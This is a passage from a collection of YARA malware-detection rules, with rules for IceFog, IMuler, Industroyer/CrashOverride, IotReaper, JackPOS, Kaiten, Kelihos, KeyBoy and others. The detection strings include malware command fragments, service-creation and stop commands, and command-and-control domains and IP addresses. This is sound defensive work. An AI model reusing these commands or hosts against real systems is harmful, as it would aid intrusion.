\"F/.pTC7\"\n        $s10 = \"O><8,)-$ \"\n        $s11 = \"mjeUB>D.'8)5\\\\\\\\vhe[\"\n        $s12 = \"JGiVRk[W]PL(\"\n        $s13 = \"zwWNNG:8\"\n        $s14 = \"zv7,'$\"\n        $a0 = \"#hsdfihdf\"\n        $a1 = \"polska.irc.pl\"\n        $b0 = \"firehim@o2.pl\"\n        $b1 = \"firehim@go2.pl\"\n        $b2 = \"firehim@tlen.pl\"\n        $c0 = \"cyberpunks.pl\"\n        $c1 = \"kaper.phrack.pl\"\n        $c2 = \"serwer.uk.to\"\n        $c3 = \"ns1.ipv4.hu\"\n        $c4 = \"scorebot.koth.hu\"\n        $c5 = \"esopoland.pl\"\n\n    condition:\n        14 of ($s*) or all of ($a*) or 1 of ($b*) or 2 of ($c*)\n}\n\nrule IceFog_Malware_Feb18_1\n{\n    meta:\n        description = \"IceFog malware\"\n        ref = \"https://twitter.com/ClearskySec/status/968104465818669057\"\n        classifications = \"Backdoor\"\n        threat_names = \"IceFog\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IceFog_Malware_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd /c %c%s%c\" fullword ascii\n        $s2 = \"temp.bat\" fullword ascii\n        $s3 = \"c:\\\\windows\\\\debug\\\\wia\\\\help\" fullword wide\n        $s4 = \"/getorder.aspx?hostname=\" fullword wide\n        $s5 = \"\\\\filecfg_temp.dat\" fullword wide\n        $s6 = \"Unknown operating system \" fullword wide\n        $s7 = \"kastygost.compress.to\" fullword wide\n        $s8 = \"/downloads/\" fullword wide\n        $s9 = \"\\\\key.dat\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 4 of them\n}\n\nprivate rule IMulerCode : IMuler Family\n{\n    meta:\n        description = \"IMuler code tricks\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"IMulerCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $L4_tmpSpotlight = { C7 ?? 2F 74 6D 70 C7 ?? 04 2F 53 70 6F }\n        $L4_TMPAAABBB = { C7 ?? ?? ?? ?? ?? 54 4D 50 41 C7 ?? ?? ?? ?? ?? 41 41 42 42 }\n        $L4_FILEAGENTVer = { C7 ?? 46 49 4C 45 C7 ?? 04 41 47 45 4E }\n        $L4_TMP0M34JDF8 = { C7 ?? ?? ?? ?? ?? 54 4D 50 30 C7 ?? ?? ?? ?? ?? 4D 33 34 4A }\n        $L4_tmpmdworker = { C7 ?? 2F 74 6D 70 C7 ?? 04 2F 2E 6D 64 }\n\n    condition:\n        any of ($L4*)\n}\n\nprivate rule IMulerStrings : IMuler Family\n{\n    meta:\n        description = \"IMuler Identifying Strings\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"IMulerStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"/cgi-mac/\"\n        $ = \"xnocz1\"\n        $ = \"checkvir.plist\"\n        $ = \"/Users/apple/Documents/mac back\"\n        $ = \"iMuler2\"\n        $ = \"/Users/imac/Desktop/macback/\"\n        $ = \"xntaskz.gz\"\n        $ = \"2wmsetstatus.cgi\"\n        $ = \"launch-0rp.dat\"\n        $ = \"2wmupload.cgi\"\n        $ = \"xntmpz\"\n        $ = \"2wmrecvdata.cgi\"\n        $ = \"xnorz6\"\n        $ = \"2wmdelfile.cgi\"\n        $ = \"/LanchAgents/checkvir\"\n        $ = \"0PERA:%s\"\n        $ = \"/tmp/Spotlight\"\n        $ = \"/tmp/launch-ICS000\"\n\n    condition:\n        any of them\n}\n\nrule IMuler : Family\n{\n    meta:\n        description = \"IMuler trojan\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"IMuler\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"IMuler\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        (\n            uint32(0) == 0xfeedface \n            or uint32(0) == 0xcefaedfe\n            or uint32(0) == 0xfeedfacf \n            or uint32(0) == 0xcffaedfe \n            or uint32(0) == 0xcafebabe \n            or uint32(0) == 0xbebafeca\n        )\n        and (IMulerCode or IMulerStrings)\n}\n\nrule Industroyer_Malware_1\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://goo.gl/x81cSy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Industroyer_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"haslo.exe\" fullword ascii\n        $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\%ls\" fullword wide\n        $s3 = \"SYS_BASCON.COM\" fullword wide\n        $s4 = \"*.pcmt\" fullword wide\n        $s5 = \"*.pcmi\" fullword wide\n        $x1 = { 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73\n         00 5C 00 25 00 6C 00 73 00 00 00 49 00 6D 00 61\n         00 67 00 65 00 50 00 61 00 74 00 68 00 00 00 43\n         00 3A 00 5C 00 00 00 44 00 3A 00 5C 00 00 00 45\n         00 3A 00 5C 00 00 00 }\n        $x2 = \"haslo.dat\\x00Crash\"\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) or 2 of them)\n}\n\nrule Industroyer_Malware_2\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://goo.gl/x81cSy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Industroyer_Malware_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"sc create %ls type= own start= auto error= ignore binpath= \\\"%ls\\\" displayname= \\\"%ls\\\"\" fullword wide\n        $x2 = \"10.15.1.69:3128\" fullword wide\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)\" fullword wide\n        $s2 = \"/c sc stop %s\" fullword wide\n        $s3 = \"sc start %ls\" fullword wide\n        $s4 = \"93.115.27.57\" fullword wide\n        $s5 = \"5.39.218.152\" fullword wide\n        $s6 = \"tierexe\" fullword wide\n        $s7 = \"comsys\" fullword wide\n        $s8 = \"195.16.88.6\" fullword wide\n        $s9 = \"TieringService\" fullword wide\n        $a1 = \"TEMP\\x00\\x00DEF\" fullword wide\n        $a2 = \"TEMP\\x00\\x00DEF-C\" fullword wide\n        $a3 = \"TEMP\\x00\\x00DEF-WS\" fullword wide\n        $a4 = \"TEMP\\x00\\x00DEF-EP\" fullword wide\n        $a5 = \"TEMP\\x00\\x00DC-2-TEMP\" fullword wide\n        $a6 = \"TEMP\\x00\\x00DC-2\" fullword wide\n        $a7 = \"TEMP\\x00\\x00CES-McA-TEMP\" fullword wide\n        $a8 = \"TEMP\\x00\\x00SRV_WSUS\" fullword wide\n        $a9 = \"TEMP\\x00\\x00SRV_DC-2\" fullword wide\n        $a10 = \"TEMP\\x00\\x00SCE-WSUS01\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) or 3 of them or 1 of ($a*)) or (5 of them)\n}\n\nrule Industroyer_Portscan_3\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper port scanner\"\n        threat_names = \"Industroyer\"\n        ref = \"https://goo.gl/x81cSy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Industroyer_Portscan_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"!ZBfamily\" fullword ascii\n        $s2 = \":g/outddomo;\" fullword ascii\n        $s3 = \"GHIJKLMNOTST\" fullword ascii\n        $d1 = \"Error params Arguments!!!\" fullword wide\n        $d2 = \"^(.+?.exe).*\\\\s+-ip\\\\s*=\\\\s*(.+)\\\\s+-ports\\\\s*=\\\\s*(.+)$\" fullword wide\n        $d3 = \"Exhample:App.exe -ip= 127.0.0.1-100,\" fullword wide\n        $d4 = \"Error IP Range %ls - %ls\" fullword wide\n        $d5 = \"Can't closesocket.\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and all of ($s*) or 2 of ($d*))\n}\n\nrule Industroyer_Portscan_3_Output\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper port scanner file\"\n        threat_names = \"Industroyer\"\n        ref = \"https://goo.gl/x81cSy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Industroyer_Portscan_3_Output\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"WSA library load complite.\" fullword ascii\n        $s2 = \"Connection refused\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule Industroyer_Malware_4\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://goo.gl/x81cSy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Industroyer_Malware_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"haslo.dat\" fullword wide\n        $s2 = \"defragsvc\" fullword ascii\n        $a1 = { 00 2E 00 64 00 61 00 74 00 00 00 43 72 61 73 68 00 00 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of ($s*) or $a1)\n}\n\nrule Industroyer_Malware_5\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://goo.gl/x81cSy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Industroyer_Malware_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"D2MultiCommService.exe\" fullword ascii\n        $x2 = \"Crash104.dll\" fullword ascii\n        $x3 = \"iec104.log\" fullword ascii\n        $x4 = \"IEC-104 client: ip=%s; port=%s; ASDU=%u \" fullword ascii\n        $s1 = \"Error while getaddrinfo executing: %d\" fullword ascii\n        $s2 = \"return info-Remote command\" fullword ascii\n        $s3 = \"Error killing process ...\" fullword ascii\n        $s4 = \"stop_comm_service_name\" fullword ascii\n        $s5 = \"*1* Data exchange: Send: %d (%s)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and (1 of ($x*) or 4 of them)) or (all of them)\n}\n\nrule Industroyer_exporting_dlls\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_exporting_dlls\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    condition:\n        pe.exports(\"Crash\") & pe.characteristics\n}\n\nrule Industroyer_suspcious\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_suspcious\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"SYS_BASCON.COM\" fullword nocase wide\n        $s1 = \".pcmp\" fullword nocase wide\n        $s2 = \".pcmi\" fullword nocase wide\n        $s3 = \".pcmt\" fullword nocase wide\n        $s4 = \".cin\" fullword nocase wide\n\n    condition:\n        pe.exports(\"Crash\") and any of ($s*)\n}\n\nrule Industroyer_name_search\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_name_search\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"101.dll\" fullword nocase wide\n        $s1 = \"Crash101.dll\" fullword nocase wide\n        $s2 = \"104.dll\" fullword nocase wide\n        $s3 = \"Crash104.dll\" fullword nocase wide\n        $s4 = \"61850.dll\" fullword nocase wide\n        $s5 = \"Crash61850.dll\" fullword nocase wide\n        $s6 = \"OPCClientDemo.dll\" fullword nocase wide\n        $s7 = \"OPC\" fullword nocase wide\n        $s8 = \"CrashOPCClientDemo.dll\" fullword nocase wide\n        $s9 = \"D2MultiCommService.exe\" fullword nocase wide\n        $s10 = \"CrashD2MultiCommService.exe\" fullword nocase wide\n        $s11 = \"61850.exe\" fullword nocase wide\n        $s12 = \"OPC.exe\" fullword nocase wide\n        $s13 = \"haslo.exe\" fullword nocase wide\n        $s14 = \"haslo.dat\" fullword nocase wide\n\n    condition:\n        any of ($s*) and pe.exports(\"Crash\")\n}\n\nrule Industroyer_moduleStrings\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_moduleStrings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"IEC-104 client: ip=%s; port=%s; ASDU=%u\" nocase wide ascii\n        $s2 = \" MSTR ->> SLV\" nocase wide ascii\n        $s3 = \" MSTR <<- SLV\" nocase wide ascii\n        $s4 = \"Unknown APDU format !!!\" nocase wide ascii\n        $s5 = \"iec104.log\" nocase wide ascii\n\n    condition:\n        any of ($s*)\n}\n\nrule Industroyer_configReader\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_configReader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }\n        $s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }\n        $s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }\n        $s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }\n\n    condition:\n        all of them\n}\n\nrule Industroyer_weirdMutex\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_weirdMutex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 85 c0 }\n        $s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}\n\n    condition:\n        all of them\n}\n\nrule Industroyer_serviceStomper\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_serviceStomper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }\n        $s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }\n\n    condition:\n        all of them\n}\n\nrule Industroyer_wiperModuleRegistry\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_wiperModuleRegistry\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }\n        $s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }\n        $s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }\n\n    condition:\n        all of them\n}\n\nrule Industroyer_wiperFileManipulation\n{\n    meta:\n        description = \"Industroyer / CrashOverride wiper\"\n        threat_names = \"Industroyer\"\n        ref = \"https://dragos.com/blog/crashoverride/CrashOverride-01.pdf\"\n        classifications = \"Wiper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dragos Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dragos_crashoverride_wiperFileManipulation\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }\n        $s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }\n\n    condition:\n        all of them\n}\n\nrule IotReaper : MALW\n{\n    meta:\n        description = \"IotReaper bot\"\n        classifications = \"Bot\"\n        threat_names = \"IotReaper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @w0lfvan\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IotReaper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"weruuoqweiur.com\"\n        $b = \"rm -f /tmp/ftpupload.sh \\n\"\n        $c = \"%02x-%02x-%02x-%02x-%02x-%02x\"\n\n    condition:\n        all of them\n}\n\nrule jackpos\n{\n    meta:\n        description = \"JackPOS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"JackPOS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"jackpos\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n        $s2 = \"/post\"\n        $s3 = \"http://\"\n        $s4 = \"&t2=\"\n        $s5 = \"&t1=\"\n        $s6 = \"mac=\"\n\n    condition:\n        all of them\n}\n\nrule easterjackpos\n{\n    meta:\n        description = \"JackPOS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"JackPOS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"easterjackpos\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"updateinterval=\"\n        $s2 = \"cardinterval=\"\n        $s3 = \"{[!17!]}{[!18!]}\"\n\n    condition:\n        all of them\n}\n\nrule Backdoor_Jolob\n{\n    meta:\n        description = \"Jolob backdoor\"\n        ref = \"http://www.symantec.com/connect/blogs/new-flash-zero-day-linked-yet-more-watering-hole-attacks\"\n        classifications = \"Backdoor\"\n        threat_names = \"Jolob\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Backdoor_Jolob\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\"\n        $eventid = \"4673\"\n        $data1 = \"Security\"\n        $data2 = \"SeCreateGlobalPrivilege\"\n        $data3 = \"Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" nocase\n        $type1 = \"Microsoft-Windows-Security-Auditing\"\n        $eventid1 = \"4688\"\n        $data4 = \"Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" nocase\n        $type2 = \"Service Control Manager\"\n        $eventid2 = \"7036\"\n        $data5 = \"Network Access Management Agent\"\n        $data6 = \"running\"\n        $type3 = \"Service Control Manager\"\n        $eventid3 = \"7045\"\n        $data7 = \"Network Access Management Agent\"\n        $data8 = \"user mode service\"\n        $data9 = \"auto start\"\n\n    condition:\n        all of them\n}\n\nrule Kaiten\n{\n    meta:\n        description = \"Kaiten bot\"\n        classifications = \"Bot\"\n        threat_names = \"Kaiten\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/tenable/yara-rules\"\n        original_name = \"Kaiten\"\n        license = \"BSD-3-Clause (https://opensource.org/licenses/BSD-3-Clause)\"\n\n    strings:\n        $irc = /(PING)|(PONG)|(NOTICE)|(PRIVMSG)/\n        $kill = \"Killing pid %d\" nocase\n        $subnet = \"What kind of subnet address is that\" nocase\n        $version = /(Helel mod)|(Kaiten wa goraku)/\n        $flood = \"UDP <target> <port> <secs>\" nocase\n\n    condition:\n        elf.type == elf.ET_EXEC and $irc and 2 of ($kill , $subnet , $version , $flood)\n}\n\nrule KasperMalware_Oct17_1\n{\n    meta:\n        description = \"Kasper backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Kasper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KasperMalware_Oct17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\kasper.pdb\" ascii\n        $x2 = \"C:\\\\D@oc@um@en@ts a@nd Set@tings\\\\Al@l Users\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 7000KB and (pe.imphash() == \"2bceb64cf37acd34bc33b38f2cddfb61\" or 1 of them)\n}\n\nrule KelihosHlux\n{\n    meta:\n        description = \"Kelihos bot\"\n        classifications = \"Backdoor, Bot\"\n        threat_names = \"Kelihos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@malpush\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"KelihosHlux\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $KelihosHlux_HexString = { 73 20 7D 8B FE 95 E4 12 4F 3F 99 3F 6E C8 28 26 C2 41 D9 8F C1 6A 72 A6 CE 36 0F 73 DD 2A 72 B0 CC D1 07 8B 2B 98 73 0E 7E 8C 07 DC 6C 71 63 F4 23 27 DD 17 56 AE AB 1E 30 52 E7 54 51 F7 20 ED C7 2D 4B 72 E0 77 8E B4 D2 A8 0D 8D 6A 64 F9 B7 7B 08 70 8D EF F3 9A 77 F6 0D 88 3A 8F BB C8 89 F5 F8 39 36 BA 0E CB 38 40 BF 39 73 F4 01 DC C1 17 BF C1 76 F6 84 8F BD 87 76 BC 7F 85 41 81 BD C6 3F BC 39 BD C0 89 47 3E 92 BD 80 60 9D 89 15 6A C6 B9 89 37 C4 FF 00 3D 45 38 09 CD 29 00 90 BB B6 38 FD 28 9C 01 39 0E F9 30 A9 66 6B 19 C9 F8 4C 3E B1 C7 CB 1B C9 3A 87 3E 8E 74 E7 71 D1 }\n\n    condition:\n        $KelihosHlux_HexString\n}\n\nrule KeyBoy_Dropper\n{\n    meta:\n        description = \"KeyBoy backdoor dropper\"\n        ref = \"https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Rapid7 Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"KeyBoy_Dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $1 = \"I am Admin\"\n        $2 = \"I am User\"\n        $3 = \"Run install success!\"\n        $4 = \"Service install success!\"\n        $5 = \"Something Error!\"\n        $6 = \"Not Configed, Exiting\"\n\n    condition:\n        all of them\n}\n\nrule KeyBoy_Backdoor\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        ref = \"https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Rapid7 Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"KeyBoy_Backdoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $1 = \"$login$\"\n        $2 = \"$sysinfo$\"\n        